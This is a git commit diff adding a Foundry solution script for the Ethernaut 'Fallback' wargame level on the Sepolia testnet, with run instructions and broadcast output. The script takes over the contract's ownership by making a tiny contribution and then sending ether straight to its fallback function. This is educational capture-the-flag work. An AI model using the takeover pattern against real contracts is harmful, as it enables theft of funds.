e1d9abe527ddda33c5c19cbc402c4c96a788245e
Darren Jensen <darren.jensen@gmail.com>
2024-09-11 19:02:52 +0700

    fallback (level1) script complete

--- contracts/script/Fallback.s.sol
+++ contracts/script/Fallback.s.sol
@@ -7,21 +7,83 @@ import "../src/levels/Fallback.sol";
 /*
     Solution script for the Ethernaut Level 1: Fallout
 
-    forge script script/Fallback.s.sol:FallbackScript --rpc-url sepolia --private-key $PKEY --broadcast
+    1. Add your priate key to the cast wallet keystore
+    2. Replace the instance address used in FallbackScript
+    3. (Dry) Run the forge script replace sender address with your wallet address
+    4. Run the forge script again with the --broadcast flag
+
+    ```
+    cast wallet import auditor --interactive
+
+    forge script script/Fallback.s.sol:FallbackScript \
+        --rpc-url sepolia \
+        --account auditor \
+        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 -vvvv
+    ```
+
+    Results of running this script (with --broadcast)
+    =================================================
+
+    ## Setting up 1 EVM.
+    ==========================
+    Simulated On-chain Traces:
+
+        [26901] 0xbEdEfE3a6f165002E45c25F2106d1967673b3921::contribute{value: 1}()
+            └─ ← [Stop]
+
+        [7302] 0xbEdEfE3a6f165002E45c25F2106d1967673b3921::fallback{value: 1}()
+            └─ ← [Stop]
+
+    ==========================
+
+    Chain 11155111
+
+    Estimated gas price: 8.070028993 gwei
+
+    Estimated total gas used for script: 105341
+
+    Estimated amount required: 0.000850104924151613 ETH
+
+    ==========================
+    Enter keystore password:
+
+    ##### sepolia
+    ✅  [Success]Hash: 0x41532c381431d715017acdc222201e5a156e8ca0b451bff760961c98b78b2367
+    Block: 6672004
+    Paid: 0.000212658355706075 ETH (47965 gas * 4.433615255 gwei)
+
+
+    ##### sepolia
+    ✅  [Success]Hash: 0x83c87e7013625ed88873c5fae98258e6ee3c360262e1e3c4037029995df025f6
+    Block: 6672004
+    Paid: 0.00012548017894701 ETH (28302 gas * 4.433615255 gwei)
+
+    ✅ Sequence #1 on sepolia | Total Paid: 0.000338138534653085 ETH (76267 gas * avg 4.433615255 gwei)
+
+
+    ==========================
+
+    ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
 */
 
 contract FallbackScript is Test {
-    Fallback level1 = Fallback(payable(0xbEdEfE3a6f165002E45c25F2106d1967673b3921));
+    // replace instance with your level1 instance adddress
+    address payable instance = payable(0xbEdEfE3a6f165002E45c25F2106d1967673b3921);
+    Fallback level1 = Fallback(instance);
 
     function run() external {
         vm.startBroadcast();
 
-        console.log("Current Owner: ", level1.owner());
+        // call the contribute function with some ether/wei
+        level1.contribute{value: 1 wei}(); 
+        // get the contribution for our user to make sure its updated
+        console.log("level1.getContribution()", level1.getContribution());
+        
+        (bool sent,) = address(level1).call{value: 1}("");
+        require(sent, "Failed to send Ether to level1 contract");
 
-        // level1.contribute{value: 1 wei}(); // call the contribute function with some ether/wei
-        // level1.getContribution(); // get the contribution for our user to make sure its updated
-        // address(level1).transfer(1 wei); // make a transfer call to trigger the receive function and become the new owner
-        level1.owner(); // check who is the new owner
+        // if the player is not the owner then we have failed so revert
+        require(level1.owner() == msg.sender, "Owner not updated correctly");
 
         vm.stopBroadcast();
     }
